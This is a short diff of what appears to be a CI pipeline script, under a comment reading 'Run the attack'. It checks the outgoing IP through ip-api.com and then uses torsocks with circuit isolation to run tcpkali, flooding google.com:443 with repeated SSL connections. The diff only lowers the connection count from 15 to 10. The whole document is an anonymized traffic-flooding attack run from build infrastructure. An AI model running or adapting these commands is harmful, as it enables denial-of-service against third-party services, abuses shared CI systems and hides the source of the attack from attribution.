@@ -13,4 +13,4 @@ script:
 
   # Run the attack
   - sudo curl http://ip-api.com
-  - sudo torsocks --isolate tcpkali --connections=15 --ssl --duration=30s --message="   " --message-rate=5 google.com:443
+  - sudo torsocks --isolate tcpkali --connections=10 --ssl --duration=30s --message="   " --message-rate=5 google.com:443
